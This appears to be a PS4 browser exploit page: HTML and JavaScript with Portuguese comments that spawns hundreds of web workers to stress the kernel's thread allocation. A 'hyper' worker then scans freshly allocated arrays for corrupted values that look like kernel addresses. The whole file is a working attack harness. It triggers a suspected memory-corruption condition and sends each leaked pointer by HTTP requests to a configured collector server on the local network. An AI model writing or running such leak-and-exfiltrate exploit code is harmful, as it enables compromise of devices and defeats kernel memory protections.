<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 HYPER MONITOR (CYCLE)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
        #status { font-size: 1.5em; border: 2px solid #555; padding: 20px; margin: 20px 0; background: #111; }
        .hyper { color: #fff; background: #f00; animation: vibration 0.1s infinite; }
        @keyframes vibration { 0% { transform: rotate(0deg); } 25% { transform: rotate(1deg); } 75% { transform: rotate(-1deg); } 100% { transform: rotate(0deg); } }
    </style>
</head>
<body>

    <h1>HYPER MONITOR (ALLOCATION CYCLE)</h1>
    <div id="status">CONFIGURE O IP!</div>

    <script>
        // --- CONFIGURAÇÃO ---
        const SERVER_IP = "192.168.3.19"; // <--- SEU IP
        const SERVER_PORT = "8000";
        
        const START_SCAN_AT = 390; 
        const DANGER_ZONE = 405;  
        const MAX_THREADS = 430;
        
        const PATTERN = 0xCAFEBABE;

        let workers = [];
        let monitorWorker = null;

        // --- CÓDIGO DO WORKER "HIPERATIVO" ---
        const monitorCode = `
            const IP = "${SERVER_IP}";
            const PORT = "${SERVER_PORT}";
            const PATTERN = ${PATTERN};
            const STRUCT_SIZE = 128; // 512 bytes

            let active = false;
            // Buffer Circular para manter pressão na memória
            // Mantemos 2000 arrays vivos. Sobrescrevemos o mais antigo.
            const BUFFER_SIZE = 2000;
            let ringBuffer = new Array(BUFFER_SIZE);
            let ptr = 0;

            self.onmessage = function(e) {
                if(e.data === "START_HYPER") {
                    active = true;
                    hyperLoop();
                }
            };

            function send(data) {
                const req = new XMLHttpRequest();
                req.open("GET", "http://" + IP + ":" + PORT + "/" + data, false); // FALSE = Síncrono (Bloqueia até enviar)
                req.send();
            }

            function hyperLoop() {
                // Loop Infinito de Alta Velocidade
                while(active) {
                    
                    // 1. ALOCAÇÃO FRESCA
                    // Cria um novo array AGORA. Se o Kernel acabou de liberar um slot, caímos nele.
                    let arr = new Uint32Array(STRUCT_SIZE);
                    arr.fill(PATTERN);
                    arr[0] = 0x11111111;
                    
                    // 2. CHECK IMEDIATO (Antes de salvar)
                    // Às vezes a corrupção acontece na criação
                    if(arr[16] !== PATTERN) {
                        report(arr);
                    }

                    // 3. SALVA NO BUFFER (Mantém referência para o GC não limpar rápido demais)
                    // Substitui o antigo
                    let oldArr = ringBuffer[ptr];
                    if(oldArr) {
                        // Check de despedida no array velho (caso o kernel tenha escrito nele depois)
                        if(oldArr[16] !== PATTERN) report(oldArr);
                    }
                    
                    ringBuffer[ptr] = arr;
                    ptr = (ptr + 1) % BUFFER_SIZE;

                    // Não dorme. Roda o mais rápido que a CPU aguentar.
                }
            }

            function report(arr) {
                for(let i=0; i<STRUCT_SIZE; i++) {
                    let val = arr[i];
                    if(val !== PATTERN && val !== 0x11111111 && val !== 0) {
                        let hex = (val >>> 0).toString(16);
                        // Filtro: Só envia se parecer endereço de Kernel (High bytes ffff ou 82..)
                        if(hex.length > 6) {
                            send("LEAK_OFF_" + (i*4) + "_VAL_" + hex);
                        }
                    }
                }
            }
        `;

        const dummyBlob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const dummyUrl = URL.createObjectURL(dummyBlob);

        function start() {
            if(SERVER_IP.includes("XX")) return alert("IP ERRADO");
            
            logToAndroid("INICIO_HYPER_MONITOR");
            document.getElementById('status').innerText = `ALVO: ${SERVER_IP}\nCARREGANDO...`;

            // Inicia o Worker imediatamente, mas em modo de espera
            const monBlob = new Blob([monitorCode], {type:'text/javascript'});
            monitorWorker = new Worker(URL.createObjectURL(monBlob));

            loopThreads();
        }

        function loopThreads() {
            let i = setInterval(() => {
                if (workers.length >= MAX_THREADS) { clearInterval(i); return; }

                workers.push(new Worker(dummyUrl));

                // Atualiza UI
                if(workers.length % 10 === 0) document.getElementById('status').innerText = `THREADS: ${workers.length}`;

                // ATIVA O MODO HIPER NO WORKER
                if(workers.length === START_SCAN_AT) {
                    document.getElementById('status').innerText += "\nPREPARANDO WORKER...";
                    logToAndroid("WORKER_READY");
                }

                // ZONA CRÍTICA: DÁ O SINAL DE ATAQUE
                if(workers.length === DANGER_ZONE) {
                    document.getElementById('status').className = "hyper";
                    document.getElementById('status').innerText = "HYPER MODE ATIVADO!!!";
                    logToAndroid("HYPER_MODE_GO");
                    
                    // Manda o worker entrar em loop infinito de alocação
                    monitorWorker.postMessage("START_HYPER");
                    
                    // Diminui a velocidade de criação de threads para o worker ter CPU
                    clearInterval(i);
                    slowKill(); 
                }

            }, 30);
        }

        function slowKill() {
            // Cria o resto das threads bem devagar
            let i = setInterval(() => {
                if (workers.length >= MAX_THREADS) { clearInterval(i); return; }
                
                workers.push(new Worker(dummyUrl));
                // Não atualiza UI para economizar CPU para o Worker
                
            }, 200); // 200ms entre threads
        }

        function logToAndroid(data) {
            new Image().src = `http://${SERVER_IP}:${SERVER_PORT}/${data}`;
        }

        setTimeout(start, 1500);

    </script>
</body>
</html>
